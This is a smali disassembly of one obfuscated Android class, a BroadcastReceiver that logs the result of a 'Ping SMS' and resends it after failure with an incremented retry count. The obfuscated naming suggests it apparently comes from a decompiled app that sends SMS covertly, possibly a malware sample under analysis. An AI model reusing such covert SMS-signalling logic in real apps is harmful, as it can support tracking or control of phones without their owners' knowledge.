.class final Lcom/network/android/a/k;
.super Landroid/content/BroadcastReceiver;


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Landroid/content/Context;

.field final synthetic c:I

.field final synthetic d:I


# direct methods
.method constructor <init>(Ljava/lang/String;Landroid/content/Context;II)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/a/k;->a:Ljava/lang/String;

    iput-object p2, p0, Lcom/network/android/a/k;->b:Landroid/content/Context;

    iput p3, p0, Lcom/network/android/a/k;->c:I

    iput p4, p0, Lcom/network/android/a/k;->d:I

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public final onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 4

    const/4 v3, 0x0

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Ping SMS SMS_SENT result: "

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/a/k;->getResultCode()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/a/k;->getResultCode()I

    move-result v0

    const/4 v1, -0x1

    if-ne v0, v1, :cond_1

    const-string v0, "Ping SMS SMS_SENT result: RESULT_OK"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/network/android/a/k;->a:Ljava/lang/String;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/network/android/a/k;->a:Ljava/lang/String;

    invoke-static {v0}, Lcom/network/android/c/a/b;->a(Ljava/lang/String;)V

    :cond_0
    :goto_0
    iget-object v0, p0, Lcom/network/android/a/k;->b:Landroid/content/Context;

    invoke-virtual {v0, p0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    return-void

    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "Ping SMS SMS_SENT result:  not(RESULT_OK) sent again in 60*1000"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/network/android/a/k;->getResultCode()I

    move-result v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    const/16 v0, 0x26

    const-string v1, ""

    iget-object v2, p0, Lcom/network/android/a/k;->a:Ljava/lang/String;

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v3, v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    const/16 v0, -0x3cae

    const-string v1, ""

    iget-object v2, p0, Lcom/network/android/a/k;->a:Ljava/lang/String;

    invoke-static {v2}, Lcom/network/h/b;->c(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v3, v0, v1, v2}, Lcom/network/android/c/a/b;->a(ISLjava/lang/String;Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/network/android/a/k;->b:Landroid/content/Context;

    iget v1, p0, Lcom/network/android/a/k;->c:I

    iget v1, p0, Lcom/network/android/a/k;->d:I

    add-int/lit8 v1, v1, 0x1

    iget-object v2, p0, Lcom/network/android/a/k;->a:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Lcom/network/android/a/c;->a(Landroid/content/Context;ILjava/lang/String;)V

    goto :goto_0
.end method
